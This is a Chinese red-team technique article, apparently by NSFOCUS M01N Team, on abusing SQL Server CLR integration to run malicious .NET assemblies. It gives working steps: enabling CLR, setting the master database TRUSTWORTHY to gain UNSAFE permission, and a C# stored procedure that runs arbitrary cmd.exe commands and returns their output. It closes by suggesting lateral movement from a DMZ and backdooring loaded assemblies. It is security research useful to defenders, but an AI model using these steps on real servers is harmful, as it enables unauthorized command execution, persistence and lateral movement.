@@ -1,0 +1,276 @@
+## **简介**
+
+为了满足数据库用户代码访问诸如表和列的数据库对象和数据库管理员代码控制对操作系统资源的访问（如文件和网络访问）的能力，微软在SQL
+Server2005之后为其引入CLR在MSSQL中运行.NET代码的能力，用户可以在托管代码中编写存储过程（stored
+procedures）、触发器（triggers）、用户定义函数（user-defined functions）、用户定义类型（user-defined
+types）、用户定义聚合（user-defined aggregates）等，利用Transact-SQL加载运行托管程序集执行代码。
+
+该功能可以被利用加载恶意托管程序集执行恶意代码，扩展在MSSQL上的攻击能力。
+
+在后续SQL版本中又增加了各种的保护以限制代码可以访问的内容。
+
+## 使用 Transact-SQL开启CLR
+
+SQL Server中的CLR集成功能默认关闭，开启方式：
+
+    
+    
+    -- 开启高级选项  
+    sp_configure 'show advanced options', 1  
+    RECONFIGURE  
+      
+    -- 开启clr  
+    sp_configure 'clr enabled', 1  
+    RECONFIGURE  
+      
+    GO
+
+## 编写CLR集成托管DLL
+
+MSDN参考文档
+
+https://docs.microsoft.com/en-us/sql/relational-databases/clr-integration/assemblies-database-engine?view=sql-server-ver15
+
+这里编写一个过程处理函数，弹出计算器。
+
+    
+    
+    using System;    
+    using System.Data;    
+    using Microsoft.SqlServer.Server;    
+    using System.Data.SqlTypes;  
+    using System.Diagnostics;  
+      
+    public class HelloWorldProc  
+    {  
+    [Microsoft.SqlServer.Server.SqlProcedure]  
+    public static void HelloWorld()  
+    {  
+    Process.Start("calc");  
+    }  
+    }
+
+编译文件
+
+    
+    
+    csc /target:library C:\helloworld.cs
+
+CLR函数
+
+1\. 必须为静态函数
+
+2\. 使用CREATE FUNCTION 名称创建函数
+
+3\. 可以使用P/INVOKE技术访问非托管代码
+
+4\. MSDN参考文档
+
+https://docs.microsoft.com/en-us/sql/relational-databases/clr-integration-database-objects-user-defined-functions/clr-user-defined-functions?view=sql-server-ver15
+
+CLR存储过程
+
+  1. 使用CREATE PROCEDURE 名称创建过程
+
+CLR触发器
+
+1\. 用户定义的聚合函数
+
+2\. 用户定义的类型
+
+访问外部资源
+
+CLR函数可以通过使用.NET
+Framework中的各种类（System.IO、System.WebServices、System.Sql）来实现，例如访问外部资源，例如文件、网络资源、Web服务、其他数据库等，但需要启用EXTERNAL_ACCESS配置权限集。
+
+## 利用
+
+使用Transact-SQL语句部署
+
+1\. 创建一个查询语句并执行
+
+    
+    
+    CREATE ASSEMBLY HelloWorld from 'c:\helloworld.dll' WITH PERMISSION_SET = SAFE;
+
+2\. 执行实例中创建过程、函数、聚合、用户定义类型或触发器
+
+    
+    
+    CREATE PROCEDURE hello  
+    AS  
+    EXTERNAL NAME HelloWorld.HelloWorldProc.HelloWorld
+
+3\. 执行
+
+    
+    
+    EXEC hello
+
+报错
+
+    
+    
+    消息 6522，级别 16，状态 1，过程 hello，第 0 行  
+    在执行用户定义例程或聚合 "hello" 期间出现 .NET Framework 错误:   
+    System.Security.SecurityException: 请求失败。  
+    System.Security.SecurityException:   
+    在 HelloWorldProc.HelloWorld()
+
+安全验证失败，SAFE模式下不能创建进程。
+
+## CLR集成安全策略
+
+通过指定 PERMISSION_SET 来指三种等级的安全策略。
+
+SAFE
+
+只允许访问内部数据，无法访问外部系统资源，例如文件、网络、环境变量或注册表。
+
+EXTERNAL_ACCESS
+
+可以访问外部系统资源，可以对外发起网络请求。
+
+UNSAFE
+
+微软推荐使用SAFE权限, 对于EXTERNAL_ACCESS 程序集默认作为SQL Server服务用户执行。
+
+使用UNSAFE策略加载程序集，我们就拥有FullTrust权限，能对进程内存以及外部资源进行访问。
+
+想要获得UNSAFE策略，需要
+
+1\. 启用 CLR strict security
+
+2\. 程序集使用证书或密钥加密签名，该证书或密钥具有相应的登录SQL服务器上的权限。或当前数据库具有TRUSTWORTHY属性（设置为ON）,
+且该数据库在服务器具有UNSAFE ASSEMBLY权限
+
+##  **利用2**
+
+移除之前的assembly
+
+    
+    
+    drop procedure hello  
+    drop assembly helloworld
+
+尝试直接使用UNSAFE策略
+
+    
+    
+    ALTER ASSEMBLY [HelloWorld] from 'c:\helloworld.dll' WITH PERMISSION_SET = UNSAFE;﻿
+
+报错
+
+    
+    
+    消息 10327，级别 14，状态 1，第 1 行  
+    针对程序集 'MyMSSQL' 的 CREATE ASSEMBLY 失败，因为程序集 'MyMSSQL' 未获授权，不满足 PERMISSION_SET = UNSAFE。满足以下两个条件之一时将给程序集授权: 数据库所有者(DBO)拥有 UNSAFE ASSEMBLY 权限，且数据库具有 TRUSTWORTHY 数据库属性；或者，程序集已使用其对应登录名具有 UNSAFE ASSEMBLY 权限的证书或非对称密钥加以签名。
+
+  
+
+重新开始，将当前数据库设置为 TRUSTWORTHY
+
+    
+    
+    ALTER DATABASE master SET TRUSTWORTHY ON;
+    
+    
+    CREATE ASSEMBLY HelloWorld AUTHORIZATION dbo from 'C:\helloworld.dll' WITH PERMISSION_SET = SAFE;  
+      
+    CREATE PROCEDURE hello  
+    AS    
+    EXTERNAL NAME helloworld.HelloWorldProc.HelloWorld   
+      
+    EXEC hello
+
+成功弹出计算器
+
+![1637722630_619daa0693d7d45b16e80.jpg!small?1637722631995](https://image.3001.net/images/20211124/1637722630_619daa0693d7d45b16e80.jpg!small?1637722631995)
+
+  
+
+    
+    
+    消息 6211，级别 16，状态 1，第 1 行  
+    由于 safe 程序集 'SyscallBypass' 中的类型 'Kernel32' 具有静态字段 'MEM_COMMIT'，CREATE ASSEMBLY 失败。safe 程序集中静态字段的属性在 Visual C# 中必须标记为 readonly，在 Visual Basic 中必须标记为 ReadOnly，或者在 Visual C++ 和中间语言中标记为 initonly。
+
+## 实现CMD命令执行
+
+参考MSDN的写法
+
+https://docs.microsoft.com/zh-tw/sql/relational-databases/clr-integration/database-objects/getting-started-with-clr-integration?view=sql-server-ver15
+
+    
+    
+    public static void cmd2(SqlString command, out string result)  
+    {  
+    Process proc = new Process();  
+    proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";  
+    proc.StartInfo.Arguments = string.Format(@" /C {0}", command.Value);  
+    proc.StartInfo.UseShellExecute = false;  
+    proc.StartInfo.RedirectStandardOutput = true;  
+    proc.StartInfo.RedirectStandardError = true;  
+    proc.StartInfo.CreateNoWindow = true;  
+    proc.Start();  
+      
+    result = proc.StandardOutput.ReadToEnd().ToString();  
+    result += proc.StandardError.ReadToEnd().ToString();  
+    proc.WaitForExit();  
+    proc.Close();  
+    }
+
+执行Transact-SQL语句
+
+    
+    
+    CREATE ASSEMBLY MSSQL from 'C:\MyMSSQL.dll' WITH PERMISSION_SET = UNSAFE;  
+      
+    CREATE PROCEDURE cmd2 @i nchar(4000), @j nchar(4000) OUTPUT  
+    AS    
+    EXTERNAL NAME MSSQL.MSSQL.cmd2   
+      
+    DECLARE @K nchar(4000)  
+    EXEC cmd2 "whoami", @K out  
+    PRINT @K
+
+![1637722797_619daaad5be3a3b842194.png!small?1637722798674](https://image.3001.net/images/20211124/1637722797_619daaad5be3a3b842194.png!small?1637722798674)
+
+但这里有一个问题，在尝试执行tasklist等返回字符串结果过长的命令时会出现错误，SQLString不支持存储较长的结果。
+
+    
+    
+    消息 6522，级别 16，状态 1，过程 cmd2，第 0 行  
+    在执行用户定义例程或聚合 "cmd2" 期间出现 .NET Framework 错误:   
+    System.Data.SqlServer.TruncationException: 正试图将大小为 14174 个字节的输出参数或返回值转换为 T-SQL 类型，该 T-SQL 类型的大小限制更小，为 8000 个字节。  
+    System.Data.SqlServer.TruncationException:   
+    在 System.Data.SqlServer.Internal.CXVariantBase.StringToWSTR(String pstrValue, Int64 cbMaxLength, Int32 iOffset, EPadding ePad)
+
+![1637722827_619daacbc6322cce3779f.png!small?1637722829119](https://image.3001.net/images/20211124/1637722827_619daacbc6322cce3779f.png!small?1637722829119)
+
+看来用这种方式无法取回所有的结果，笔者暂未找到解决方式，欢迎对此感兴趣的同学来交流学习。
+
+## 优势
+
+当攻击者成功从外部进入DMZ区域后，可能会面临一种受限场景，即面临只能正向访问一些特定服务（如数据库和某些Web应用）且服务机器无法出网，如果此时服务机器运行有MSSQL，就可以通过给MSSQL加载恶意托管程序集的方式实现横向扩展。
+
+  
+
+管理员也可能会加载托管程序访问计算机资源执行任务，通过遍历已加载的程序集并导出到本地，并修改添加后门，通过ALTER更新MSSQL服务器中的程序集。
+
+## 参考
+
+https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/clr-integration-architecture-clr-hosted-environment?view=sql-server-ver15
+
+https://www.blackarrow.net/mssqlproxy-pivoting-clr/
+
+https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/
+
+https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/amp/
+
+<https://github.com/NetSPI/PowerUpSQL>
+
+##  **绿盟科技 M01N Team 战队**
+
+绿盟科技M01N战队专注于Red
+Team、APT等高级攻击技术、战术及威胁研究，涉及Web安全、终端安全、AD安全、云安全等相关领域。通过研判现网攻击技术发展方向，以攻促防，为风险识别及威胁对抗提供决策支撑，全面提升安全防护能力。
+
